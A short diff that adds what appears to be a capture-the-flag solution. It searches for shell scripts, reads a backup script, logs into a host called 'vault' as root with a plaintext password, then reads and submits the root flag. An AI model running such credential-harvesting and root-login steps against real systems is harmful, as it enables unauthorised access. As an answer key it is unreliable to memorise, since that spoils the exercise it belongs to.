@@ -1,0 +1,6 @@
+find / -name '*.sh'
+cat /opt/scripts/backup.sh
+ssh root@vault
+R00t-Halcyon!
+cat /root/flag.txt
+submit flag{least_privilege_matters}
